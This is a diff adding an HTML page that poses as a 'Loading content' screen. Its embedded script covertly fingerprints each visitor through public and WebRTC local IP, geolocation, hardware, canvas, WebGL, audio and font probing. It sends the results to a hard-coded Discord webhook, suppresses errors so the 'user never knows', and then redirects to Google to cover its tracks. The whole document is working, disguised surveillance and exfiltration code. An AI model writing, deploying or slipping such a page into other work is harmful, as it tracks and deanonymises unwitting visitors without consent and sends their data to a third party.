@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Content</title>
+    <style>
+        body { font-family: sans-serif; padding: 40px; background: #f5f5f5; color: #333; max-width: 600px; margin: 0 auto; }
+        .container { background: white; border-radius: 12px; padding: 30px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
+        h1 { color: #222; font-size: 24px; }
+        p { line-height: 1.6; color: #555; }
+        .loader { border: 3px solid #eee; border-top: 3px solid #333; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>Loading content...</h1>
+    <p>Please wait while we prepare your content.</p>
+    <div class="loader"></div>
+</div>
+
+<script>
+    // ── CONFIG ───────────────────────────────────────────
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1529651032848863304/8TvnbnKJaZc2lBuzSX153czw9-hWGHUiyWxcG4flB1fekfgZqjCCdcVcT1Aedw7TZzxB';
+    // ────────────────────────────────────────────────────
+
+    (async function() {
+        const results = {};
+
+        // ── 1. Public IP & Geo ───────────────────────────
+        try {
+            const ipResp = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResp.json();
+            results.public_ip = ipData.ip;
+        } catch(e) { results.public_ip = 'Unavailable'; }
+
+        try {
+            const geoResp = await fetch(`https://ipapi.co/${results.public_ip}/json/`);
+            const geoData = await geoResp.json();
+            results.ip_country = geoData.country_name || 'N/A';
+            results.ip_region = geoData.region || 'N/A';
+            results.ip_city = geoData.city || 'N/A';
+            results.ip_isp = geoData.org || 'N/A';
+            results.ip_latitude = geoData.latitude;
+            results.ip_longitude = geoData.longitude;
+            results.ip_timezone = geoData.timezone;
+        } catch(e) { /* geo is optional */ }
+
+        // ── 2. Basic navigator properties ────────────────
+        results.user_agent = navigator.userAgent;
+        results.platform = navigator.platform;
+        results.vendor = navigator.vendor;
+        results.language = navigator.language;
+        results.languages = JSON.stringify(navigator.languages);
+        results.cookie_enabled = navigator.cookieEnabled;
+        results.do_not_track = navigator.doNotTrack;
+        results.online = navigator.onLine;
+        results.hardware_concurrency = navigator.hardwareConcurrency;
+        results.device_memory = navigator.deviceMemory || 'Unavailable';
+        results.max_touch_points = navigator.maxTouchPoints;
+
+        // ── 3. Screen ────────────────────────────────────
+        results.screen_width = screen.width;
+        results.screen_height = screen.height;
+        results.screen_avail_width = screen.availWidth;
+        results.screen_avail_height = screen.availHeight;
+        results.screen_color_depth = screen.colorDepth;
+        results.screen_pixel_ratio = window.devicePixelRatio;
+        results.screen_orientation = screen.orientation?.type || 'N/A';
+
+        // ── 4. Time & Location ───────────────────────────
+        results.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        results.timezone_offset = new Date().getTimezoneOffset();
+        results.local_time = new Date().toLocaleString();
+
+        // ── 5. Connection (Chrome-based) ──────────────────
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            results.connection_type = conn.effectiveType || 'N/A';
+            results.connection_downlink = conn.downlink + ' Mbps';
+            results.connection_rtt = conn.rtt + ' ms';
+        } else {
+            results.connection_type = 'Unavailable';
+        }
+
+        // ── 6. Touch support ─────────────────────────────
+        results.touch_supported = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+
+        // ── 7. Plugins & MIME types ──────────────────────
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+        }
+        results.plugins = JSON.stringify(plugins);
+
+        const mimeTypes = [];
+        for (let i = 0; i < navigator.mimeTypes.length; i++) {
+            mimeTypes.push(navigator.mimeTypes[i].type);
+        }
+        results.mime_types = JSON.stringify(mimeTypes.slice(0, 30)); // limit size
+
+        // ── 8. Referer & URL ─────────────────────────────
+        results.referrer = document.referrer || 'Direct / None';
+        results.page_url = window.location.href;
+
+        // ── 9. Canvas fingerprint ────────────────────────
+        try {
+            const c = document.createElement('canvas');
+            c.width = 200; c.height = 50;
+            const ctx = c.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('HackerAI fp', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('b3nch', 4, 17);
+            results.canvas_fingerprint = c.toDataURL().substring(0, 80) + '...';
+            // Also compute a hash
+            const dataUrl = c.toDataURL();
+            let hash = 0;
+            for (let i = 0; i < dataUrl.length; i++) {
+                const chr = dataUrl.charCodeAt(i);
+                hash = ((hash << 5) - hash) + chr;
+                hash |= 0;
+            }
+            results.canvas_hash = hash;
+        } catch(e) { results.canvas_fingerprint = 'Error: ' + e.message; }
+
+        // ── 10. WebGL fingerprint (GPU) ──────────────────
+        try {
+            const c2 = document.createElement('canvas');
+            const gl = c2.getContext('webgl') || c2.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    results.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    results.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+        } catch(e) { /* WebGL may fail */ }
+
+        // ── 11. AudioContext fingerprint ─────────────────
+        try {
+            const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+            const osc = audioCtx.createOscillator();
+            osc.type = 'triangle';
+            osc.frequency.value = 10000;
+            const compressor = audioCtx.createDynamicsCompressor();
+            compressor.threshold.value = -50;
+            compressor.knee.value = 40;
+            compressor.ratio.value = 12;
+            compressor.reduction.value = -20;
+            osc.connect(compressor);
+            compressor.connect(audioCtx.destination);
+            osc.start(0);
+            const rendered = await audioCtx.startRendering();
+            const bufferData = rendered.getChannelData(0).slice(0, 50);
+            const audioHash = bufferData.reduce((acc, v) => acc + Math.abs(v), 0).toFixed(6);
+            results.audio_fingerprint = audioHash;
+        } catch(e) { results.audio_fingerprint = 'Unavailable'; }
+
+        // ── 12. WebRTC local IP leak ─────────────────────
+        try {
+            const localIP = await new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
+                        resolve('No local IP detected');
+                        return;
+                    }
+                    const match = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                    if (match) {
+                        resolve(match[1]);
+                        pc.close();
+                    }
+                };
+                setTimeout(() => resolve('Timeout'), 3000);
+            });
+            results.webrtc_local_ip = localIP;
+        } catch(e) { results.webrtc_local_ip = 'Unavailable'; }
+
+        // ── 13. Font detection (common fonts) ────────────
+        const testFonts = [
+            'Arial', 'Verdana', 'Times New Roman', 'Georgia', 'Courier New',
+            'Impact', 'Comic Sans MS', 'Trebuchet MS', 'Palatino', 'Lucida Console',
+            'Tahoma', 'Segoe UI', 'Helvetica', 'Calibri', 'Cambria',
+            'Consolas', 'Monaco', 'Menlo', 'Roboto', 'Open Sans'
+        ];
+        const detected = [];
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        const testStr = 'mmmmmmmmwwwwww';
+        const testSize = '72px';
+        const testDiv = document.createElement('div');
+        testDiv.style.position = 'absolute';
+        testDiv.style.left = '-9999px';
+        testDiv.style.visibility = 'hidden';
+        testDiv.style.fontSize = testSize;
+        document.body.appendChild(testDiv);
+
+        const baseWidths = {};
+        for (const base of baseFonts) {
+            testDiv.style.fontFamily = base;
+            testDiv.textContent = testStr;
+            baseWidths[base] = testDiv.offsetWidth;
+        }
+
+        for (const font of testFonts) {
+            let found = false;
+            for (const base of baseFonts) {
+                testDiv.style.fontFamily = `"${font}", ${base}`;
+                testDiv.textContent = testStr;
+                if (testDiv.offsetWidth !== baseWidths[base]) {
+                    found = true;
+                    break;
+                }
+            }
+            if (found) detected.push(font);
+        }
+        document.body.removeChild(testDiv);
+        results.detected_fonts = JSON.stringify(detected);
+
+        // ── 14. Adblock detection ────────────────────────
+        try {
+            const adTest = document.createElement('div');
+            adTest.innerHTML = '&nbsp;';
+            adTest.className = 'adsbox';
+            adTest.style.position = 'absolute';
+            adTest.style.left = '-9999px';
+            document.body.appendChild(adTest);
+            await new Promise(r => setTimeout(r, 100));
+            const hidden = adTest.offsetHeight === 0;
+            document.body.removeChild(adTest);
+            results.adblocker_detected = hidden;
+        } catch(e) { results.adblocker_detected = 'Error'; }
+
+        // ── Send to Discord ──────────────────────────────
+        const embedFields = [
+            { name: '🌐 Public IP', value: results.public_ip, inline: true },
+            { name: '📍 Location', value: `${results.ip_city || '?'}, ${results.ip_region || '?'}, ${results.ip_country || '?'}`, inline: true },
+            { name: '🏢 ISP', value: results.ip_isp || 'N/A', inline: true },
+            { name: '🖥️ OS / Browser', value: results.user_agent?.substring(0, 100) || 'N/A', inline: false },
+            { name: '🧠 CPU Cores', value: String(results.hardware_concurrency), inline: true },
+            { name: '💾 RAM', value: results.device_memory + ' GB', inline: true },
+            { name: '📺 Screen', value: `${results.screen_width}x${results.screen_height} @${results.screen_pixel_ratio}x`, inline: true },
+            { name: '🕐 Timezone', value: results.timezone, inline: true },
+            { name: '🌍 Language', value: results.language, inline: true },
+            { name: '📡 Connection', value: `${results.connection_type} (${results.connection_downlink})`, inline: true },
+            { name: '🎨 GPU', value: results.webgl_renderer?.substring(0, 60) || 'N/A', inline: false },
+            { name: '🎧 Audio FP', value: results.audio_fingerprint, inline: true },
+            { name: '🖼️ Canvas Hash', value: String(results.canvas_hash), inline: true },
+            { name: '🔤 Detected Fonts', value: (results.detected_fonts?.length > 60 ? results.detected_fonts.substring(0, 60) + '...' : results.detected_fonts) || 'N/A', inline: false },
+            { name: '🏠 Local IP (WebRTC)', value: results.webrtc_local_ip, inline: true },
+            { name: '🔗 Referrer', value: results.referrer?.substring(0, 80) || 'None', inline: false },
+            { name: '📋 Platform', value: results.platform, inline: true },
+            { name: '🛑 Adblocker', value: String(results.adblocker_detected), inline: true },
+            { name: '🖱️ Touch', value: String(results.touch_supported), inline: true },
+            { name: '🍪 Cookies', value: String(results.cookie_enabled), inline: true },
+        ];
+
+        const payload = {
+            content: `**🔍 Passive Intelligence Report**`,
+            embeds: [{
+                title: `New Visitor — ${results.ip_country || 'Unknown'}`,
+                color: 0x2b2d31,
+                fields: embedFields,
+                footer: { text: `URL: ${results.page_url?.substring(0, 80) || 'N/A'}` },
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch(e) {
+            // Silently fail — user never knows
+        }
+
+        // ── Redirect to a benign page after collection ───
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 2000);
+
+    })();
+</script>
+</body>
+</html>
